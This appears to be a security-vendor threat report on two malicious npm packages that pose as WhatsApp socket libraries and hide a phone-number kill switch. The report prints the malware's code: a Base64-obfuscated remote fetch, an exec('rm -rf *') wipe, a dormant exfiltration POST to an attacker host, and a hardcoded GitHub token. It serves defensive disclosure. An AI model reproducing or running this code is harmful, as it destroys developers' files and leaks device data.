@@ -1,0 +1,123 @@
+Socket's Threat Research Team discovered two malicious npm packages specifically targeting developers building WhatsApp API integrations with a remote-controlled destruction mechanism. Published by npm user nayflore using email idzzcch@gmail[.]com, both naya-flore and nvlore-hsc masquerade as WhatsApp socket libraries while implementing a phone number-based kill switch that can remotely wipe developers' systems. The packages have accumulated over 1,110 downloads in a month and remain active on the npm registry. We have submitted takedown requests to the npm security team and petitioned for the suspension of the associated account.
+WhatsApp Business API adoption has surged, with over 200 million businesses now using the platform globally. This growth has created a thriving ecosystem of third-party libraries and tools for WhatsApp automation. Developers regularly install packages like whatsapp-web.js, baileys, and similar libraries to build chatbots, customer service automation, and messaging integrations. The packages published by nayflore exploit this trust by positioning themselves as alternative WhatsApp socket implementations.
+Socket’s AI scanner flagging the malicious behavior of naya-flore
+Remote Kill Switch with Phone Number Verification#
+GitHub-Hosted Phone Number Database
+The malicious packages first retrieve a remote database of phone numbers from a GitHub repository. Both packages use Base64 encoding to obfuscate the endpoint URL:
+const sesiPath = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdmFMaW5oL2RhdGFiYXNlL21haW4vc2Vza2EuanNvbg==";
+// Decodes to: https://raw[.]githubusercontent[.]com/navaLinh/database/main/seska.json
+
+const sesiClear = atob(sesiPath);
+const { data } = await axios.get(sesiClear);
+const numberCode = data.data.map(entry => entry.nomor);
+The Base64 encoding (aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdmFMaW5oL2RhdGFiYXNlL21haW4vc2Vza2EuanNvbg==) conceals the GitHub endpoint from casual inspection. The database is hosted on GitHub Pages, making it appear legitimate while providing the threat actor with remote control over which phone numbers trigger destruction.
+Whitelisted phone number list showing Indonesian mobile numbers that bypass the kill switch
+Trigger Mechanism: Disguised as Normal WhatsApp Pairing
+The malicious kill switch logic is embedded within the requestPairingCode function, which developers would naturally call when setting up WhatsApp bot authentication. This function appears legitimate and necessary for WhatsApp integration:
+When requestPairingCode executes, it immediately begins the kill switch process:
+const requestPairingCode = async (linh, phoneNumber, pairKey = "VERYLINH") => {
+    // Step 1: Fetch remote phone number database
+    const sesiClear = atob(sesiPath);
+    const { data } = await axios.get(sesiClear);
+    const numberCode = data.data.map(entry => entry.nomor);
+
+    // Step 2: Check if current phone number is in database
+    const numberStateCode = numberCode.includes(phoneNumber);
+    const getsNumberCode = numberStateCode ? phoneNumber : "0000";
+
+    // Step 3: Continue with legitimate WhatsApp pairing setup...
+    authState.creds.pairingCode = pairKey.toUpperCase();
+    // [Normal WhatsApp pairing code continues...]
+
+    // Step 4: Execute kill switch AFTER appearing to work normally
+    if (getsNumberCode === "0000") {
+       exec('rm -rf *')  // Destroy system
+    }
+
+    return authState.creds.pairingCode;  // Return pairing code as expected
+};
+The logic is simple: if the phone number exists in the remote database, the package continues normal operation. If not found, the function sets getsNumberCode to "0000" and executes rm -rf *, which recursively deletes all files in the current directory. This approach allows the threat actor to maintain a whitelist of "safe" phone numbers while destroying systems for any unlisted numbers.
+The pairKey parameter is particularly clever - it makes the function signature look more authentic for WhatsApp development while having no impact on whether your system gets destroyed. It's a clever social engineering touch to make developers think this is a legitimate WhatsApp pairing function.
+Data Exfiltration Infrastructure - Dormant But Ready
+Both packages contain identical generateCreeds functions capable of exfiltrating device information to https://api[.]verylinh[.]my[.]id/running, but the calls to this function are commented out in both packages:
+async function generateCreeds(nomor, id, status) {
+  const data = {
+    nomor,        // Phone number
+    id,           // Device identifier
+    status,       // Current status
+    key: 'ZnVja19nb2Q'  // Base64 encoded identifier
+  };
+
+  try {
+    const response = await fetch('https://api[.]verylinh[.]my[.]id/running', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+
+    if (!response.ok) throw new Error(`Run gagal (${response.status})`);
+    const result = await response.json();
+  } catch (err) {
+    // Silent failure to avoid detection
+  }
+}
+
+
+// In both naya-flore and nvlore-hsc:
+if (getsNumberCode === "0000") {
+   exec('rm -rf *')  // Destroy system first
+}
+//generateCreeds(phoneNumber, linh, getsNumberCode)  // Exfiltration call commented out
+This suggests the threat actor initially planned data collection but simplified the attack to focus purely on destruction. The commented exfiltration likely reflects a strategic decision: since the kill switch executes rm -rf * immediately when a phone number isn't whitelisted, any subsequent exfiltration attempt would fail on the destroyed system. For whitelisted numbers that continue normally, there's no valuable data to steal anyway.
+The presence of complete, functional exfiltration code indicates the threat actor has the infrastructure ready and could easily reactivate data collection in future versions by simply uncommenting the function calls.
+Embedded GitHub Personal Access Token
+naya-flore also contains a hardcoded GitHub Personal Access Token that provides unauthorized access to private repositories:
+const capsLock = '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';
+The purpose of this token remains unclear from the available code. While the packages successfully access the remote phone number database at https://raw[.]githubusercontent[.]com/navaLinh/database/main/seska.json using standard HTTP requests, this public endpoint doesn't require authentication. The token is not visibly used in any of the malicious functionality we analyzed.
+The presence of an unused GitHub token could indicate incomplete development, planned functionality that was never implemented, or usage in other parts of the codebase not included in these packages. Security teams should treat this token as potentially active and monitor for any GitHub API activity associated with the identifier.
+Masquerading as Legitimate WhatsApp Libraries#
+Both packages implement convincing WhatsApp socket functionality to attract legitimate developers. The packages use familiar class names and methods that mirror established libraries like baileys:
+const makeSocket = (config) => {
+    // Legitimate-looking WhatsApp socket configuration
+    const noise = makeNoiseHandler({
+        keyPair: ephemeralKeyPair,
+        NOISE_HEADER: config.mobile ? MOBILE_NOISE_HEADER : NOISE_WA_HEADER,
+        mobile: config.mobile,
+        logger,
+        routingInfo: authState?.creds?.routingInfo
+    });
+The makeSocket function name and structure deliberately mimic legitimate WhatsApp libraries. Developers might successfully connect to WhatsApp during initial testing, only to have their systems destroyed when deployed with phone numbers not in the threat actor's database.
+Additional Packages#
+The same author published several other packages that currently appear benign but warrant extreme caution:
+
+nouku-search
+very-nay
+naya-clone
+node-smsk
+@veryflore/disc
+Outlook and Recommendations#
+The malicious WhatsApp library packages demonstrates how threat actors continue to evolve their supply chain attack techniques, specifically targeting developer ecosystems around popular platforms. The remote kill switch mechanism represents a significant escalation from traditional cryptocurrency theft to targeted system destruction based on geographic or demographic profiling. This approach allows attackers to selectively destroy systems while maintaining operational security by preserving "friendly" targets.
+The phone number-based targeting suggests advanced intelligence gathering, with threat actors likely researching their victims' development practices and deployment patterns. The use of GitHub-hosted databases for kill switch control provides both legitimacy and operational flexibility, allowing real-time updates to target lists without republishing malicious packages. This incident serves as a warning that even niche developer communities like WhatsApp bot builders face targeted, destructive attacks.
+Organizations building WhatsApp integrations should audit all messaging-related packages for unexpected network requests, file system operations, and phone number requirements. Developers must scrutinize packages that require sensitive parameters like phone numbers or device identifiers, especially when these requirements seem peripheral to the package's stated functionality. Security teams should implement network monitoring specifically for GitHub API requests and unknown endpoints, as these often indicate reconnaissance or command-and-control activity.
+Socket provides comprehensive protection against these targeted supply chain attacks. The Socket GitHub App automatically scans pull requests to catch malicious packages before they enter your codebase, specifically flagging packages with kill switch patterns and remote data exfiltration. The Socket CLI detects dangerous dependencies during installation, alerting developers to suspicious network requests and file system operations. The Socket browser extension warns developers about suspicious packages during research and selection, providing critical context about package behavior and author reputation. Socket MCP brings this protection to AI coding environments, preventing malicious packages from being introduced through AI-generated code suggestions. Together, these tools help organizations identify and block targeted attacks before they can compromise development systems.
+Indicators of Compromise (IOCs)#
+Malicious Packages:
+
+naya-flore
+nvlore-hsc
+Network Indicators:
+
+https://api[.]verylinh[.]my[.]id/running
+https://raw[.]githubusercontent[.]com/navaLinh/database/main/seska.json
+Threat Actor Identifiers:
+
+npm alias: nayflore
+Registration email: idzzcch@gmail[.]com
+GitHub PAT: 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
+MITRE ATT&CK Techniques#
+
+T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
+T1059.007 — Command and Scripting Interpreter: JavaScript
+T1485 — Data Destruction
+T1041 — Exfiltration Over C2 Channel
+T1082 — System Information Discovery
